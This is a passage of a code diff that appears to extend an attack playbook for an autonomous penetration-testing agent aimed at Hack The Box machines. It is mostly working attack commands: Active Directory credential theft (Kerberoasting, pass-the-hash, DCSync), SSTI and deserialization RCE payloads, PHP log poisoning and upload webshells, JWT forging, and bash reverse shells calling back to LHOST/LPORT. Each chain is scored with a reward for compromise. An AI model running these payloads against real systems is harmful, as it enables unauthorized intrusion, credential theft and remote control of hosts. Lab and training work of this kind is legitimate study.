@@ -1242,6 +1242,102 @@ HTB_COMMON_PATTERNS = {
         "hash_cracking": ["hashcat", "john", "CrackStation (online)"],
         "network_analysis": ["wireshark", "tshark", "tcpdump"],
     },
+
+    # Phase 42: Image / Steganography / Forensics Analysis Patterns
+    "image_forensics": {
+        "description": "Image and file forensics techniques for hidden data extraction",
+        "reasoning": "CTF and some HTB boxes hide critical information in images, audio files, and "
+                     "binary data. The agent must learn to systematically analyze all downloaded files "
+                     "for hidden data, metadata secrets, and embedded archives.",
+        "techniques": [
+            {"name": "EXIF metadata extraction", "commands": ["exiftool image.jpg", "exiftool -a -u -g1 image.jpg"],
+             "reasoning": "EXIF data contains GPS coords, camera info, software versions, and crucially — "
+                          "custom comment/description fields where authors hide passwords and hints."},
+            {"name": "Steghide extraction (JPEG/WAV)", "commands": ["steghide extract -sf image.jpg", "steghide extract -sf image.jpg -p ''", "steghide info image.jpg"],
+             "reasoning": "Steghide embeds data in JPEG and WAV files. Try empty passphrase first, then "
+                          "common passwords. steghide info reveals if data is embedded without extracting."},
+            {"name": "Binwalk firmware/archive analysis", "commands": ["binwalk image.png", "binwalk -e image.png", "binwalk --dd='.*' image.png"],
+             "reasoning": "Binwalk detects and extracts embedded files within images: ZIP archives, gzip data, "
+                          "certificates, ELF binaries. Use -e to auto-extract. Common in CTF challenges."},
+            {"name": "String search in binary files", "commands": ["strings image.png | grep -i 'pass\\|flag\\|key\\|secret\\|user\\|admin'", "strings -n 8 file"],
+             "reasoning": "Simple but effective. Strings finds printable text in binary files. "
+                          "Passwords, flags, and URLs can be embedded directly in image/binary data."},
+            {"name": "PNG LSB steganography", "commands": ["zsteg image.png", "zsteg -a image.png"],
+             "reasoning": "LSB (Least Significant Bit) steganography hides data in pixel color values. "
+                          "zsteg detects and extracts LSB-encoded data from PNG/BMP files."},
+            {"name": "Foremost file carving", "commands": ["foremost -i image.dd -o output/", "foremost -t all -i disk.img"],
+             "reasoning": "Foremost carves files from raw data/images based on headers and footers. "
+                          "Useful for recovering deleted files from disk images."},
+            {"name": "Hex dump analysis", "commands": ["xxd image.jpg | head -50", "hexdump -C file | grep -i 'PK\\|7z\\|Rar'"],
+             "reasoning": "Manual hex analysis reveals file magic bytes, appended data after file end, "
+                          "and data hidden between file structure elements."},
+        ],
+    },
+
+    # Phase 42: HTML / PHP / Web Source Analysis Patterns
+    "web_source_analysis": {
+        "description": "Techniques for analyzing web page source code for vulnerabilities and hidden data",
+        "reasoning": "HTML source, JavaScript files, and PHP error messages contain critical information: "
+                     "hidden form fields, commented-out credentials, API endpoints, JavaScript logic flaws, "
+                     "and debug information that reveals internal architecture.",
+        "techniques": [
+            {"name": "HTML comment mining", "commands": ["curl -s http://target/ | grep '<!--'", "view-source:http://target/"],
+             "reasoning": "HTML comments frequently contain TODO notes with passwords, disabled endpoints, "
+                          "developer notes revealing backend technology, and debug information."},
+            {"name": "JavaScript source analysis", "commands": ["curl -s http://target/js/app.js | grep -i 'api\\|token\\|password\\|key\\|secret\\|endpoint'", "curl http://target/ | grep -oP 'src=\"[^\"]+\\.js\"'"],
+             "reasoning": "Client-side JavaScript reveals API endpoints, hardcoded tokens/keys, "
+                          "authentication logic, and hidden functionality. Minified JS can be beautified."},
+            {"name": "Hidden form fields and inputs", "commands": ["curl -s http://target/ | grep 'type=\"hidden\"'", "curl -s http://target/ | grep -i 'input.*name'"],
+             "reasoning": "Hidden form fields may contain: access tokens, user roles, CSRF tokens, "
+                          "internal IDs, or privilege levels that can be modified by the attacker."},
+            {"name": "PHP error information disclosure", "commands": ["curl 'http://target/?param[]=invalid'", "curl 'http://target/nonexistent.php'"],
+             "reasoning": "PHP errors reveal: full file paths, PHP version, framework version, "
+                          "database connection strings, and stack traces with function names."},
+            {"name": "robots.txt and sitemap analysis", "commands": ["curl http://target/robots.txt", "curl http://target/sitemap.xml"],
+             "reasoning": "robots.txt reveals hidden directories that admins don't want indexed. "
+                          "Common findings: /admin, /backup, /uploads, /api, /internal, /dev."},
+            {"name": "Cookie and header analysis", "commands": ["curl -v http://target/ 2>&1 | grep -i 'set-cookie\\|x-powered\\|server\\|x-frame'", "curl -s -D- http://target/"],
+             "reasoning": "Response headers reveal: server software (nginx/Apache/IIS), framework (X-Powered-By), "
+                          "session technology (PHPSESSID=PHP, JSESSIONID=Java, connect.sid=Node.js)."},
+            {"name": "WordPress enumeration", "commands": ["wpscan --url http://target/ --enumerate u,p,t", "curl http://target/wp-json/wp/v2/users"],
+             "reasoning": "WordPress is ubiquitous. Enumerate users (/wp-json/wp/v2/users), plugins, and themes. "
+                          "Vulnerable plugins are the #1 WordPress attack vector on HTB."},
+            {"name": "Source map discovery", "commands": ["curl http://target/js/app.js.map", "curl http://target/main.js.map"],
+             "reasoning": "Source maps expose original unminified source code. Find .map files by adding "
+                          ".map to JS URLs or checking //# sourceMappingURL= comments in JS files."},
+        ],
+    },
+
+    # Phase 42: Active Directory Attack Patterns
+    "active_directory": {
+        "description": "Active Directory attack patterns for Windows domain environments",
+        "reasoning": "Many medium/hard HTB boxes involve Active Directory. The attack flow is: "
+                     "enumerate domain → find misconfigurations → escalate to Domain Admin. "
+                     "Tools: Impacket, BloodHound, Rubeus, certipy, CrackMapExec.",
+        "techniques": [
+            {"name": "Domain enumeration", "commands": ["enum4linux -a target", "crackmapexec smb target -u '' -p '' --shares", "ldapsearch -x -H ldap://target -b 'DC=domain,DC=htb'"],
+             "reasoning": "Anonymous/guest SMB and LDAP access reveals domain info, users, shares. "
+                          "CrackMapExec is the Swiss Army knife for Windows domain testing."},
+            {"name": "AS-REP Roasting", "commands": ["GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip target", "hashcat -m 18200 hash.txt rockyou.txt"],
+             "reasoning": "Users without Kerberos pre-authentication can have their AS-REP ticket "
+                          "cracked offline. Enumerate with no password required."},
+            {"name": "Kerberoasting", "commands": ["GetUserSPNs.py domain/user:password -dc-ip target -request", "hashcat -m 13100 tgs.txt rockyou.txt"],
+             "reasoning": "Service accounts with SPNs have TGS tickets crackable offline. "
+                          "Often lead to service accounts with admin privileges."},
+            {"name": "Pass-the-Hash", "commands": ["impacket-psexec domain/admin@target -hashes :NTLM_HASH", "crackmapexec smb target -u admin -H NTLM_HASH"],
+             "reasoning": "NTLM hashes can be used for authentication without cracking. "
+                          "psexec gives SYSTEM shell, wmiexec gives admin shell."},
+            {"name": "BloodHound attack path analysis", "commands": ["bloodhound-python -c all -u user -p pass -d domain.htb -ns target", "neo4j console && bloodhound"],
+             "reasoning": "BloodHound maps AD relationships and finds attack paths to Domain Admin. "
+                          "Look for: shortest path to DA, users with DCSync rights, GenericAll/WriteDACL ACLs."},
+            {"name": "DCSync attack", "commands": ["secretsdump.py domain/admin@target", "mimikatz 'lsadump::dcsync /domain:domain.htb /user:Administrator'"],
+             "reasoning": "DCSync replicates domain controller's password database. Requires Replicating "
+                          "Directory Changes privilege. Dumps all NTLM hashes including Administrator."},
+            {"name": "Certificate Services abuse (ADCS)", "commands": ["certipy find -u user -p pass -dc-ip target -vulnerable", "certipy req -u user -p pass -dc-ip target -ca CA -template TemplateName -upn administrator@domain.htb"],
+             "reasoning": "Misconfigured ADCS certificate templates allow requesting certificates as other "
+                          "users (ESC1-ESC8). certipy automates discovery and exploitation."},
+        ],
+    },
 }
 
 HTB_KILL_CHAINS: List[KillChain] = [
@@ -1967,6 +2063,506 @@ HTB_KILL_CHAINS: List[KillChain] = [
                           "root.txt", "root"),
         ),
     ),
+
+    # =========================================================================
+    # Phase 42: New Kill Chains — Web App Attack Patterns
+    # =========================================================================
+
+    KillChain(
+        name="htb_ssti_to_rce",
+        description="SSTI detection → template injection → RCE → Linux privesc",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Server-side template injection is extremely common on HTB. Flask/Jinja2 apps that "
+                  "render user input directly into templates are exploitable. The agent must learn to "
+                  "detect SSTI ({{7*7}}=49), then escalate to full RCE via Python MRO chain.",
+        total_expected_reward=380.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port and service scan",
+                          "Discover all services. Look for Python/Flask/Gunicorn on any port.",
+                          "80/tcp open http... 5000/tcp open http Werkzeug", "open"),
+            KillChainStep("enumeration", "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,py,html",
+                          "Directory and file enumeration",
+                          "Find application endpoints, admin panels, and input forms.",
+                          "/login... /register... /profile...", "/"),
+            KillChainStep("enumeration", "curl -s http://{target}/register -d 'username={{7*7}}&password=test' && curl http://{target}/profile",
+                          "Test for SSTI via math expression in user input",
+                          "If registration accepts {{7*7}} and profile shows 49, SSTI is confirmed. "
+                          "Also test ${7*7}, #{7*7}, <%=7*7%> for different engines.",
+                          "49", "49"),
+            KillChainStep("exploitation",
+                          "curl -d 'username={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}' http://{target}/register",
+                          "SSTI to RCE via Jinja2 Python MRO chain",
+                          "Navigate __class__.__init__.__globals__ to reach os module. "
+                          "Or use __subclasses__() to find subprocess.Popen at index ~408.",
+                          "uid=33(www-data)", "uid="),
+            KillChainStep("exploitation",
+                          "SSTI reverse shell: bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'",
+                          "Upgrade from command output to reverse shell",
+                          "URL-encode the reverse shell payload and inject via SSTI.",
+                          "www-data@target:$", "www-data@"),
+            KillChainStep("privilege_escalation", "find / -perm -4000 -type f 2>/dev/null && sudo -l && cat /etc/crontab",
+                          "Standard Linux privesc enumeration",
+                          "Check SUID binaries, sudo permissions, cron jobs. "
+                          "One of these will always yield a privesc path on HTB.",
+                          "User may run... NOPASSWD...", "root"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_lfi_log_poison_rce",
+        description="LFI discovery → log poisoning → RCE → shell → privesc",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Local File Inclusion is one of the most versatile web vulns. The kill chain goes: "
+                  "find LFI → try PHP wrappers for source read → if PHP, log poison for RCE. "
+                  "This pattern appears in ~30% of HTB web boxes.",
+        total_expected_reward=360.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port and service scan",
+                          "Find web services. Apache/nginx with PHP is the primary target.",
+                          "80/tcp open http Apache", "open"),
+            KillChainStep("enumeration", "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php",
+                          "Find PHP endpoints for LFI testing",
+                          "Look for endpoints with file/page parameters: ?page=, ?file=, ?include=.",
+                          "index.php... page.php...", ".php"),
+            KillChainStep("enumeration",
+                          "curl 'http://{target}/page.php?page=../../../../../../etc/passwd'",
+                          "Confirm LFI via /etc/passwd read",
+                          "Path traversal with ../ sequences. Try different depths. URL-encode if blocked.",
+                          "root:x:0:0", "root:x:"),
+            KillChainStep("enumeration",
+                          "curl 'http://{target}/page.php?page=php://filter/convert.base64-encode/resource=page.php'",
+                          "Read PHP source via php://filter wrapper",
+                          "Base64-encode PHP source to avoid execution. Reveals config paths, DB creds, "
+                          "and include logic for further exploitation.",
+                          "PD9waHA=", "PD9"),
+            KillChainStep("exploitation",
+                          "curl -H 'User-Agent: <?php system($_GET[\"cmd\"]); ?>' http://{target}/ && curl 'http://{target}/page.php?page=../../var/log/apache2/access.log&cmd=id'",
+                          "Log poisoning: inject PHP into access.log via User-Agent, include via LFI",
+                          "Apache/nginx logs store User-Agent strings. Inject PHP code that gets executed "
+                          "when the log file is included via LFI. Classic LFI-to-RCE escalation.",
+                          "uid=33(www-data)", "uid="),
+            KillChainStep("exploitation",
+                          "Reverse shell via log poisoning: curl '...&cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261\"'",
+                          "Get interactive reverse shell",
+                          "URL-encode reverse shell command through the LFI+log poison chain.",
+                          "www-data@target:$", "www-data@"),
+            KillChainStep("privilege_escalation", "cat wp-config.php, find / -name '*.conf' -o -name '.env' 2>/dev/null",
+                          "Hunt for credentials in config files",
+                          "Web app configs contain DB creds. DB creds often == user SSH passwords.",
+                          "password", "pass"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_file_upload_to_shell",
+        description="File upload vulnerability → webshell → reverse shell → privesc",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Unrestricted file upload is a direct path to RCE. The agent must learn to bypass "
+                  "common upload restrictions: extension blacklists, MIME checks, magic byte validation. "
+                  "This chain covers all bypass techniques systematically.",
+        total_expected_reward=370.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port and service scan",
+                          "Find web services with file upload functionality.",
+                          "80/tcp open http", "open"),
+            KillChainStep("enumeration", "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,aspx,jsp",
+                          "Find upload endpoints and determine server technology",
+                          "Look for /upload, /avatar, /profile, /import endpoints.",
+                          "/upload... /profile...", "/"),
+            KillChainStep("enumeration",
+                          "curl -s -D- http://{target}/upload | grep -i 'server\\|x-powered-by\\|set-cookie'",
+                          "Identify server technology from response headers",
+                          "X-Powered-By: PHP → .php shell. ASP.NET → .aspx shell. Determine shell type.",
+                          "PHP", "PHP"),
+            KillChainStep("exploitation",
+                          "curl -F 'file=@shell.php;type=image/png' http://{target}/upload (try: .php, .phtml, .php5, .pht, GIF89a;<?php)",
+                          "Upload PHP webshell with extension/MIME bypass",
+                          "Try multiple bypass techniques: double extension (.php.jpg), null byte (.php%00.jpg), "
+                          "alternative extensions (.phtml/.php5/.pht), MIME spoof (image/png), magic bytes prepend.",
+                          "uploaded successfully", "upload"),
+            KillChainStep("exploitation",
+                          "curl 'http://{target}/uploads/shell.phtml?cmd=id' → reverse shell",
+                          "Trigger webshell and escalate to reverse shell",
+                          "Navigate to uploaded file, execute commands, then upgrade to reverse shell.",
+                          "uid=33(www-data)", "uid="),
+            KillChainStep("privilege_escalation", "sudo -l && find / -perm -4000 2>/dev/null",
+                          "Linux privesc enumeration",
+                          "Check sudo, SUID, capabilities, cron as www-data user.",
+                          "NOPASSWD", "root"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_jwt_forge_to_admin",
+        description="JWT discovery → secret crack/bypass → admin forge → RCE",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="JWT-based authentication is ubiquitous in modern web apps. Weak secrets, algorithm "
+                  "confusion (RS256→HS256), and 'none' algorithm are common attack vectors. "
+                  "Once admin JWT is forged, the admin panel usually has upload/exec functionality.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port and service scan",
+                          "Find web services. JWT-based apps are common on Node.js and Python stacks.",
+                          "80/tcp open http", "open"),
+            KillChainStep("enumeration", "Login with test creds → intercept JWT from response/cookie → decode at jwt.io",
+                          "Capture and analyze JWT token structure",
+                          "JWT has 3 base64 parts: header.payload.signature. Check algorithm (HS256/RS256), "
+                          "payload claims (role, admin, is_admin), and look for the secret.",
+                          "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9", "eyJ"),
+            KillChainStep("exploitation",
+                          "hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt (or try alg:none)",
+                          "Crack JWT secret or bypass algorithm",
+                          "Weak secrets crack with hashcat/john. Try alg:none for no signature. "
+                          "Try RS256→HS256 confusion if RS256 is used (sign with public key as HMAC secret).",
+                          "secret123", "secret"),
+            KillChainStep("exploitation",
+                          "python3 jwt_tool.py OLD_TOKEN -S hs256 -p 'cracked_secret' -I -pc role -pv admin",
+                          "Forge admin JWT with cracked secret",
+                          "Modify role/admin claim and re-sign with known secret.",
+                          "Authorization: Bearer eyJ...", "eyJ"),
+            KillChainStep("exploitation",
+                          "Access admin panel with forged JWT → find upload/exec/command functionality",
+                          "Use admin access for code execution",
+                          "Admin panels often have: file upload, template editing, plugin install, "
+                          "database queries, or direct command execution features.",
+                          "admin", "admin"),
+            KillChainStep("privilege_escalation", "sudo -l && cat /opt/*/config* && env",
+                          "Privesc from web app user", "escalate from service user to root.",
+                          "root", "root"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_api_idor_data_leak",
+        description="API enumeration → IDOR → data extraction → credential reuse → shell",
+        target_profile="generic",
+        difficulty="easy",
+        reasoning="APIs with sequential IDs and no authorization checks are extremely common. "
+                  "IDOR (Insecure Direct Object Reference) lets you access other users' data by "
+                  "changing ID values. Leaked data often contains passwords or tokens.",
+        total_expected_reward=340.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan",
+                          "Find API endpoints on standard and non-standard ports.",
+                          "80/tcp open http... 3000/tcp open http", "open"),
+            KillChainStep("enumeration",
+                          "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt && curl http://{target}/api/",
+                          "Find API endpoints and documentation",
+                          "Look for /api/, /v1/, /v2/, /graphql, swagger/openapi docs, /docs, /redoc.",
+                          "/api/... /data/...", "/api"),
+            KillChainStep("enumeration",
+                          "curl http://{target}/api/users/1 && curl http://{target}/api/users/0 && curl http://{target}/data/0",
+                          "Test for IDOR by changing numeric IDs",
+                          "Change /users/5 to /users/0, /users/1, /data/0 etc. "
+                          "Also try negative IDs, UUIDs, and batch endpoints.",
+                          "username... password...", "user"),
+            KillChainStep("exploitation",
+                          "Download and analyze leaked data (PCAP, configs, credentials)",
+                          "Extract credentials from IDOR-leaked data",
+                          "PCAP files may contain cleartext FTP/HTTP creds. Config files have passwords. "
+                          "User profiles may expose emails/hashes. (Source: Cap — IDOR leaked PCAP with FTP creds)",
+                          "password", "pass"),
+            KillChainStep("exploitation", "ssh user@{target} with IDOR-leaked credentials",
+                          "Use leaked credentials for SSH access",
+                          "Password reuse: leaked web creds often work for SSH.",
+                          "user@target:~$", "user@"),
+            KillChainStep("privilege_escalation", "getcap -r / 2>/dev/null && sudo -l",
+                          "Enumerate privesc paths",
+                          "Check capabilities, SUID, sudo for escalation to root.",
+                          "cap_setuid", "root"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_php_type_juggling_auth_bypass",
+        description="PHP type juggling → auth bypass → admin → webshell → privesc",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="PHP's loose comparison (==) with type juggling is a classic CTF/HTB pattern. "
+                  "Magic hashes starting with 0e are treated as scientific notation (0). "
+                  "Password comparisons using == can be bypassed with specific hash values.",
+        total_expected_reward=330.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan",
+                          "Find PHP web applications.",
+                          "80/tcp open http Apache", "open"),
+            KillChainStep("enumeration",
+                          "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php && wappalyzer/whatweb http://{target}",
+                          "Identify PHP CMS/framework and login endpoints",
+                          "Find login.php, admin.php, or CMS admin panel.",
+                          "login.php... admin.php...", ".php"),
+            KillChainStep("enumeration",
+                          "curl 'http://{target}/page.php?page=php://filter/convert.base64-encode/resource=login.php'",
+                          "Read PHP source for loose comparison vulnerability if LFI exists",
+                          "Look for: if($password == $stored_hash) — loose comparison is exploitable. "
+                          "Also look for strcmp() which returns 0 (truthy) when given an array.",
+                          "==", "=="),
+            KillChainStep("exploitation",
+                          "curl -d 'username=admin&password[]=anything' http://{target}/login.php (or use 0e magic hash)",
+                          "Bypass authentication via type juggling",
+                          "Send password as array to break strcmp(). Or use hash starting with 0e (treated as 0). "
+                          "Magic hashes: 0e215962017 (md5 of 240610708), 0e462097431906509019562988736854.",
+                          "admin panel... dashboard...", "admin"),
+            KillChainStep("exploitation",
+                          "Upload webshell via admin panel theme editor or plugin upload",
+                          "Leverage admin access for code execution",
+                          "Most CMS admin panels allow: template editing (inject PHP), "
+                          "plugin/module upload (upload PHP shell), or database access.",
+                          "www-data@target:$", "www-data@"),
+            KillChainStep("privilege_escalation", "sudo -l && find / -writable -type f 2>/dev/null | grep -v proc",
+                          "Privesc enumeration as www-data",
+                          "writable scripts in cron, misconfigured sudo, SUID binaries.",
+                          "root", "root"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_deserialization_to_rce",
+        description="Identify serialized data → craft gadget chain → RCE → privesc",
+        target_profile="generic",
+        difficulty="hard",
+        reasoning="Deserialization attacks (Java, PHP, Python, Ruby) are high-impact and common on "
+                  "harder HTB boxes. The agent must recognize serialized data formats (base64, hex, "
+                  "magic bytes) and use appropriate tools (ysoserial, phpggc, pickle payloads).",
+        total_expected_reward=400.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan",
+                          "Identify application stack. Java→ysoserial, PHP→phpggc, Python→pickle.",
+                          "8080/tcp open http Tomcat... 8443/tcp...", "open"),
+            KillChainStep("enumeration",
+                          "Intercept requests → look for Base64 cookies, ViewState, serialized objects in POST data",
+                          "Identify serialized object inputs",
+                          "Look for: base64 in cookies (Java serialized starts with rO0A), "
+                          "PHP's O:N: format, Python pickle (\\x80\\x05), .NET ViewState, XML-RPC.",
+                          "rO0ABX... or O:4:\"User\"...", "rO0"),
+            KillChainStep("exploitation",
+                          "ysoserial CommonsCollections1 'bash -c {echo,BASE64_REVSHELL}|{base64,-d}|{bash,-i}' > payload.bin",
+                          "Generate serialized gadget chain payload",
+                          "Match library versions to correct gadget chain. "
+                          "Java: ysoserial (CommonsCollections, Spring, Hibernate). "
+                          "PHP: phpggc (Monolog, Guzzle, Laravel, Symfony). "
+                          "Python: craft pickle with __reduce__.",
+                          "payload.bin", "payload"),
+            KillChainStep("exploitation",
+                          "curl -X POST http://{target}/api -H 'Content-Type: application/x-java-serialized-object' --data-binary @payload.bin",
+                          "Send serialized payload to trigger RCE",
+                          "Replace the serialized data in the request with the gadget chain payload. "
+                          "May need correct Content-Type and encoding.",
+                          "user@target:$", "user@"),
+            KillChainStep("privilege_escalation",
+                          "linpeas.sh → analyze for misconfigured services/sudo/capabilities",
+                          "Automated privesc enumeration",
+                          "Application service users often have docker/lxd group membership or "
+                          "can access internal services (MySQL root without password, Redis, etc.).",
+                          "root", "root"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_git_leak_to_creds",
+        description="Exposed .git → source code → hardcoded creds → SSH → privesc",
+        target_profile="generic",
+        difficulty="easy",
+        reasoning="Exposed .git directories are a goldmine. They contain full source code history "
+                  "including deleted files and old commits. Developers often commit credentials "
+                  "and later remove them, but git history preserves everything.",
+        total_expected_reward=320.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan",
+                          "Find web services and SSH for later access.",
+                          "22/tcp open ssh... 80/tcp open http", "open"),
+            KillChainStep("enumeration",
+                          "curl -s http://{target}/.git/HEAD && gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
+                          "Check for exposed .git directory",
+                          "If /.git/HEAD returns 'ref: refs/heads/master', the .git is exposed. "
+                          "Also check /.git/config, /.env, /robots.txt, /sitemap.xml.",
+                          "ref: refs/heads", "ref:"),
+            KillChainStep("enumeration",
+                          "python3 git-dumper.py http://{target}/.git/ git_dump && cd git_dump && git log --oneline --all",
+                          "Dump and reconstruct git repository",
+                          "git-dumper recursively downloads .git contents and reconstructs the repo. "
+                          "Then review commit history for sensitive changes.",
+                          "commit", "commit"),
+            KillChainStep("exploitation",
+                          "git diff HEAD~5 HEAD -- '*.env' '*.config' '*.php' '*.py' | grep -i 'password\\|secret\\|key\\|token'",
+                          "Search git history for credentials and secrets",
+                          "Check diff of recent commits for passwords removed in 'cleanup' commits. "
+                          "Also: git log --all -p -- '*.env' to see all .env file changes.",
+                          "password", "pass"),
+            KillChainStep("exploitation", "ssh user@{target} with discovered credentials",
+                          "Use git-leaked credentials for SSH",
+                          "Developers reuse passwords. Git creds often work for SSH.",
+                          "user@target:~$", "user@"),
+            KillChainStep("privilege_escalation", "sudo -l && cat /etc/crontab",
+                          "Standard Linux privesc",
+                          "Check for easy paths: sudo misconfiguration or writable cron scripts.",
+                          "root", "root"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_ssrf_to_internal_service",
+        description="Discover SSRF → access internal/filtered services → exploit internal app → privesc",
+        target_profile="generic",
+        difficulty="hard",
+        reasoning="SSRF allows the agent to reach services that are firewalled from external access. "
+                  "Many HTB boxes have filtered ports hosting vulnerable internal services. The attack "
+                  "chain goes: find SSRF → discover internal ports → exploit internal vulnerability.",
+        total_expected_reward=380.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan including filtered ports",
+                          "Note both OPEN and FILTERED ports. Filtered ports may be accessible via SSRF.",
+                          "80/tcp open... 3000/tcp filtered...", "filtered"),
+            KillChainStep("enumeration",
+                          "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt && identify SSRF-capable endpoints",
+                          "Find web app endpoints that make outbound requests",
+                          "Look for: URL parameters (?url=, ?redirect=, ?proxy=, ?fetch=, ?path=), "
+                          "webhook configs, import-from-URL features, RSS feed parsers, PDF generators.",
+                          "url=... redirect=... proxy=...", "url"),
+            KillChainStep("exploitation",
+                          "curl 'http://{target}/proxy?url=http://127.0.0.1:3000/' (test internal access)",
+                          "Confirm SSRF and enumerate internal services",
+                          "Try accessing localhost ports through the SSRF: 127.0.0.1, 0.0.0.0, [::1], "
+                          "decimal IP (2130706433), hex IP (0x7f000001). Scan ports 1-65535 through SSRF.",
+                          "Internal service response", "internal"),
+            KillChainStep("exploitation",
+                          "Exploit internal service via SSRF proxy (e.g., maltrail login injection, jenkins console)",
+                          "Chain SSRF with exploit for internal vulnerable service",
+                          "Use SSRF to proxy exploit requests to the internal service. "
+                          "Configure reverse shell callback to your external IP.",
+                          "user@target:$", "user@"),
+            KillChainStep("privilege_escalation",
+                          "sudo -l → find pager/editor escape (sudo systemctl → !sh, sudo less → !sh)",
+                          "Pager/editor escape via sudo",
+                          "systemctl, less, more, man, vi with sudo all allow shell escape via !sh or !bash.",
+                          "root@target:#", "root@"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_exiftool_rce_via_upload",
+        description="Image upload → ExifTool RCE via crafted metadata → shell → privesc",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="CVE-2021-22204 exploits ExifTool's DjVu metadata parsing for arbitrary code execution. "
+                  "Many web apps process uploaded images with ExifTool for metadata extraction/stripping. "
+                  "This is a reliable RCE vector that bypasses traditional file upload filters.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan",
+                          "Find web services with image upload functionality.",
+                          "80/tcp open http", "open"),
+            KillChainStep("enumeration",
+                          "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,html",
+                          "Find upload endpoints (avatar, gallery, import)",
+                          "Look for user profile photo upload, gallery, document upload, or any file handling.",
+                          "/upload... /gallery... /profile...", "/"),
+            KillChainStep("enumeration",
+                          "Upload normal image and check response headers/behavior for ExifTool indicators",
+                          "Confirm server-side image processing",
+                          "If image metadata is stripped or dimensions are returned, server likely uses "
+                          "ExifTool or similar. Check error messages for tool identifiers.",
+                          "image processed... metadata...", "image"),
+            KillChainStep("exploitation",
+                          "python3 exiftool_exploit.py -s LHOST LPORT → upload crafted DjVu/JPEG via form",
+                          "Upload CVE-2021-22204 exploit image",
+                          "Craft DjVu file with Perl eval payload in metadata field. Upload via the "
+                          "standard image upload form. ExifTool processes it and executes the payload.",
+                          "www-data@target:$", "www-data@"),
+            KillChainStep("privilege_escalation",
+                          "find / -name '*.conf' -o -name '*.db' 2>/dev/null && cat /opt/*/config.yml",
+                          "Search for credentials in app config and database files",
+                          "Web app user often has access to config files with DB passwords. "
+                          "Check /opt, /var/www, /srv, /etc/ for config files with credentials.",
+                          "password", "pass"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_subdomain_vhost_to_shell",
+        description="Subdomain/vhost discovery → hidden app → exploit → shell → privesc",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Many HTB boxes have virtual hosts (subdomains) that aren't visible on the main page. "
+                  "gobuster vhost or ffuf -H 'Host: FUZZ.target.htb' reveals hidden applications that "
+                  "may be more vulnerable than the main site. Always add target.htb to /etc/hosts.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -sC -p- {target}", "Full port scan",
+                          "Find web services. Note any redirect to domain names (e.g., target.htb).",
+                          "80/tcp open http... redirect to target.htb", "open"),
+            KillChainStep("enumeration",
+                          "echo '{target} target.htb' >> /etc/hosts && ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://target.htb -H 'Host: FUZZ.target.htb' -fw LEN",
+                          "Virtual host / subdomain enumeration",
+                          "Use ffuf or gobuster vhost to discover subdomains. Filter by response size. "
+                          "Add discovered subdomains to /etc/hosts too.",
+                          "dev.target.htb... admin.target.htb...", ".htb"),
+            KillChainStep("enumeration",
+                          "echo '{target} dev.target.htb' >> /etc/hosts && gobuster dir -u http://dev.target.htb -w /usr/share/wordlists/dirb/common.txt -x php,html",
+                          "Enumerate discovered subdomain application",
+                          "The hidden vhost often runs a different, more vulnerable application. "
+                          "Enumerate it separately — it may have admin panels or debug endpoints.",
+                          "200 OK", "200"),
+            KillChainStep("exploitation",
+                          "Exploit vulnerability in hidden vhost app (varies: SQLi, SSTI, file upload, default creds)",
+                          "Exploit the hidden application",
+                          "Hidden apps are often dev/staging instances with debug mode, default creds, "
+                          "or known CVEs. They may be older or less hardened than the main site.",
+                          "user@target:$", "user@"),
+            KillChainStep("privilege_escalation", "sudo -l && id && find / -perm -4000 2>/dev/null",
+                          "Standard Linux privesc",
+                          "Check sudo, groups, SUID, capabilities, cron.",
+                          "root", "root"),
+        ),
+    ),
+
+    KillChain(
+        name="htb_graphql_introspection_to_shell",
+        description="GraphQL discovery → introspection → IDOR/mutation abuse → admin → shell",
+        target_profile="generic",
+        difficulty="medium",
